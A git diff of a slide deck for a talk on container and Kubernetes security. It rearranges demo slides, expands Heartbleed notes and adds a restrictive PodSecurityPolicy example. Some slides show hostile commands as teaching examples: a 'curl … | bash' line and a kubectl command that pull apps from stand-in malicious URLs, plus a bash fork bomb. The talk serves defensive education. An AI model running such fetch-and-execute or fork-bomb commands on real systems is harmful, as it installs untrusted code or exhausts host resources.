@@ -137,10 +137,6 @@ Recap and tips to take away.
 
 ---
 
-# [fit] Climate *Change*
-
----
-
 ![left](assets/lewisthen.JPG)
 
 # [fit] NDC*OSLO*2017
@@ -148,6 +144,10 @@ Recap and tips to take away.
 ---
 
 # [fit] Community
+
+---
+
+# [fit] Climate *Change*
 
 ---
 
@@ -269,28 +269,19 @@ But is there a better option.
 
 ---
 
-# [fit] Where do we 
-# [fit] *learn*
-
-^
-Whats the next step for us to learn this?
-
----
-
-![inline 90%](assets/google-awssecurity.png)
-![inline 90%](assets/google-googlecloudsecurity.png)
-![inline 90%](assets/google-azuresecurity.png)
-
----
-
-![inline 90%](assets/google-kubernetessecurity.png)
-![inline 90%](assets/google-akssecurity.png)
-![inline 90%](assets/google-ekssecurity.png)
-![inline 90%](assets/google-gkesecurity.png)
-
----
-
 # [fit] Lets get *started*
+
+---
+
+# [fit] Demo *1*
+
+## Lets *own* a website
+
+---
+
+# [fit] Lets *review*
+
+^ What just happened
 
 ---
 
@@ -310,18 +301,6 @@ Hands up
 ---
 
 ![80%](assets/yourcodeistheproblem.png)
-
----
-
-# [fit] Demo *1*
-
-## Lets own a website
-
----
-
-# [fit] Lets *review*
-
-^ What just happened
 
 ---
 
@@ -346,10 +325,33 @@ Undesirable consequences.
 ## Heartbleed
 
 ^
-The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).
-The Heartbleed bug allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and user
+1/2
+The Heartbleed Bug is a serious vulnerability in the popular OpenSSL library.
+allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software.
 
 ---
+
+![150%](assets/heartbleed.png)
+
+# Example
+
+## Heartbleed
+
+^
+2/2
+This compromises the secret keys used to identify the service providers and to encrypt the traffic
+attackers to eavesdrop on communications,
+steal data directly from the services
+users and to impersonate services and user
+
+---
+
+# [fit] Demo *2*
+
+## [fit] *Jump* into the *box*
+
+---
+
 
 # [fit] How can we *prevent* this?
 
@@ -532,9 +534,36 @@ How do we know what we're running is what we built?
 
 ---
 
+# [fit] Demo *3*
+
+## *Escape* the container
+
+---
+
 # [fit] Running *containers*
 
 # [fit] on *Kubernetes*
+
+---
+
+# [fit] Where do we 
+# [fit] *learn*
+
+^
+Whats the next step for us to learn this?
+
+---
+
+![inline 90%](assets/google-awssecurity.png)
+![inline 90%](assets/google-googlecloudsecurity.png)
+![inline 90%](assets/google-azuresecurity.png)
+
+---
+
+![inline 90%](assets/google-kubernetessecurity.png)
+![inline 90%](assets/google-akssecurity.png)
+![inline 90%](assets/google-ekssecurity.png)
+![inline 90%](assets/google-gkesecurity.png)
 
 ---
 
@@ -575,6 +604,16 @@ $ kubectl create -f http://Insert_Malicious_URL_here/FakeApp.yaml
 $ curl SRI-Tools.com/fakeapp.sh | bash
 $ Kubectl create –f http://SRI-Tools.com/k8s/FakeApp.yaml
 ```
+
+---
+
+# [fit] :(){ :|:& };:
+
+^
+13 characters, 1 fork bomb.
+Spins up threads.
+Unmanaged can take a load of resoruce.
+Resource that can be used elsewhere.
 
 ---
 
@@ -634,9 +673,15 @@ Decent CI/CD should prevent this from happening.
 
 # How to run as a non-root user?
 
+^
+So how do we avoid this?
+
 ---
 
 # User command in Dockerfile.
+
+^
+Can specify this within the dockerfile when we build it.
 
 --
 
@@ -653,12 +698,6 @@ Decent CI/CD should prevent this from happening.
 ---
 
 # API
-
----
-
-# [fit] Demo *2*
-
-## [fit] Show me the *api*
 
 ---
 
@@ -712,7 +751,208 @@ Determines if it should be run based on policies.
 
 ---
 
-# TODO: More information on PodSecurityPolicies
+```yaml
+apiVersion: policy/v1beta1
+kind: PodSecurityPolicy
+metadata:
+  name: restricted
+  annotations:
+    seccomp.security.alpha.kubernetes.io/allowedProfileNames: 'docker/default,runtime/default'
+    apparmor.security.beta.kubernetes.io/allowedProfileNames: 'runtime/default'
+    seccomp.security.alpha.kubernetes.io/defaultProfileName:  'runtime/default'
+    apparmor.security.beta.kubernetes.io/defaultProfileName:  'runtime/default'
+spec:
+  privileged: false
+  allowPrivilegeEscalation: false
+  requiredDropCapabilities:
+    - ALL
+  # Allow core volume types.
+  volumes:
+    - 'configMap'
+    - 'emptyDir'
+    - 'projected'
+    - 'secret'
+    - 'downwardAPI'
+    # Assume that persistentVolumes set up by the cluster admin are safe to use.
+    - 'persistentVolumeClaim'
+  hostNetwork: false
+  hostIPC: false
+  hostPID: false
+  runAsUser:
+    # Require the container to run without root privileges.
+    rule: 'MustRunAsNonRoot'
+  seLinux:
+    # This policy assumes the nodes are using AppArmor rather than SELinux.
+    rule: 'RunAsAny'
+  supplementalGroups:
+    rule: 'MustRunAs'
+    ranges:
+      # Forbid adding the root group.
+      - min: 1
+        max: 65535
+  fsGroup:
+    rule: 'MustRunAs'
+    ranges:
+      # Forbid adding the root group.
+      - min: 1
+        max: 65535
+  readOnlyRootFilesystem: false
+```
+
+^
+privileged
+Required to prevent escalations to root.
+
+---
+
+```yaml
+apiVersion: policy/v1beta1
+kind: PodSecurityPolicy
+metadata:
+  name: restricted
+  annotations:
+    seccomp.security.alpha.kubernetes.io/allowedProfileNames: 'docker/default,runtime/default'
+    apparmor.security.beta.kubernetes.io/allowedProfileNames: 'runtime/default'
+    seccomp.security.alpha.kubernetes.io/defaultProfileName:  'runtime/default'
+    apparmor.security.beta.kubernetes.io/defaultProfileName:  'runtime/default'
+spec:
+  privileged: false
+  allowPrivilegeEscalation: false
+  requiredDropCapabilities:
+    - ALL
+  # Allow core volume types.
+  volumes:
+    - 'configMap'
+    - 'emptyDir'
+    - 'projected'
+    - 'secret'
+    - 'downwardAPI'
+    # Assume that persistentVolumes set up by the cluster admin are safe to use.
+    - 'persistentVolumeClaim'
+  hostNetwork: false
+  hostIPC: false
+  hostPID: false
+  runAsUser:
+    # Require the container to run without root privileges.
+    rule: 'MustRunAsNonRoot'
+  seLinux:
+    # This policy assumes the nodes are using AppArmor rather than SELinux.
+    rule: 'RunAsAny'
+  supplementalGroups:
+    rule: 'MustRunAs'
+    ranges:
+      # Forbid adding the root group.
+      - min: 1
+        max: 65535
+  fsGroup:
+    rule: 'MustRunAs'
+    ranges:
+      # Forbid adding the root group.
+      - min: 1
+        max: 65535
+  readOnlyRootFilesystem: false
+```
+
+^
+allowprivaledgeescalations
+This is redundant with non-root + disallow privilege escalation,
+but we can provide it for defense in depth.
+
+---
+
+```yaml
+apiVersion: policy/v1beta1
+kind: PodSecurityPolicy
+metadata:
+  name: restricted
+  annotations:
+    seccomp.security.alpha.kubernetes.io/allowedProfileNames: 'docker/default,runtime/default'
+    apparmor.security.beta.kubernetes.io/allowedProfileNames: 'runtime/default'
+    seccomp.security.alpha.kubernetes.io/defaultProfileName:  'runtime/default'
+    apparmor.security.beta.kubernetes.io/defaultProfileName:  'runtime/default'
+spec:
+  privileged: false
+  allowPrivilegeEscalation: false
+  requiredDropCapabilities:
+    - ALL
+  volumes:
+    - 'configMap'
+    - 'emptyDir'
+    - 'projected'
+    - 'secret'
+    - 'downwardAPI'
+    - 'persistentVolumeClaim'
+  hostNetwork: false
+  hostIPC: false
+  hostPID: false
+  runAsUser:
+    rule: 'MustRunAsNonRoot'
+  seLinux:
+    rule: 'RunAsAny'
+  supplementalGroups:
+    rule: 'MustRunAs'
+    ranges:
+      - min: 1
+        max: 65535
+  fsGroup:
+    rule: 'MustRunAs'
+    ranges:
+      - min: 1
+        max: 65535
+  readOnlyRootFilesystem: false
+```
+
+^
+runAsUser
+Require the container to run without root privileges.
+
+---
+
+```yaml
+apiVersion: policy/v1beta1
+kind: PodSecurityPolicy
+metadata:
+  name: restricted
+  annotations:
+    seccomp.security.alpha.kubernetes.io/allowedProfileNames: 'docker/default,runtime/default'
+    apparmor.security.beta.kubernetes.io/allowedProfileNames: 'runtime/default'
+    seccomp.security.alpha.kubernetes.io/defaultProfileName:  'runtime/default'
+    apparmor.security.beta.kubernetes.io/defaultProfileName:  'runtime/default'
+spec:
+  privileged: false
+  allowPrivilegeEscalation: false
+  requiredDropCapabilities:
+    - ALL
+  volumes:
+    - 'configMap'
+    - 'emptyDir'
+    - 'projected'
+    - 'secret'
+    - 'downwardAPI'
+    - 'persistentVolumeClaim'
+  hostNetwork: false
+  hostIPC: false
+  hostPID: false
+  runAsUser:
+    rule: 'MustRunAsNonRoot'
+  seLinux:
+    rule: 'RunAsAny'
+  supplementalGroups:
+    rule: 'MustRunAs'
+    ranges:
+      - min: 1
+        max: 65535
+  fsGroup:
+    rule: 'MustRunAs'
+    ranges:
+      - min: 1
+        max: 65535
+  readOnlyRootFilesystem: false
+```
+
+^
+supplementalGroups
+Forbid adding the root group.
 
 ---
 
@@ -751,11 +991,46 @@ Limits the restrictions on the kubelet.
 
 ---
 
-# TODO: Kubelet
+# [fit] Demo *4*
+
+## Can we see whats *running*
 
 ---
 
-# [fit] :(){ :|:& };:
+# [fit] Security Boundaries
+
+^
+The strucutre of Kubernetes
+
+---
+
+# [fit] Cluster
+
+^
+All the nodes and control plane.
+
+---
+
+# [fit] Node
+
+^
+VM or bare metal
+Only processes what is scheduled.
+
+---
+
+# [fit] Namespace
+
+^
+A virutal cluster of multiple resources.
+Basic unit for authorization.
+Can restrict resource depletion, prevent denial of service attacks.
+
+---
+
+# [fit] Pod
+
+Group of containers that run on the same node.
 
 ---
 
@@ -811,6 +1086,12 @@ Limits the restrictions on the kubelet.
 * Ian Coldwater *@IanColdwater*
 * Aled James *@a\_ll\_james*
 * Nial Merrigan *@nmerrigan*
+
+---
+
+# [fit] Drop the ladder
+
+## [fit] *https://github.com/denhamparry/talks*
 
 ---
 
